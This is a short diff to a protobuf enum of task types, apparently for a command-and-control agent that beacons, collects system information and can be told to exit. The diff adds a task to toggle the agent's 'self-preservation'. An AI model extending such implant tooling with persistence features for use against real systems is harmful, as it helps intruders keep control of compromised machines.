@@ -58,6 +58,7 @@ enum TaskType {
   TASK_TYPE_SYSINFO    = 4;  // Collect system information
   TASK_TYPE_SLEEP      = 5;  // Change beacon interval
   TASK_TYPE_EXIT       = 6;  // Terminate the agent
+  TASK_TYPE_SELFPRESERVE = 7; // Toggle self-preservation on/off
 }
 
 // ──────────────────────────────────────────────
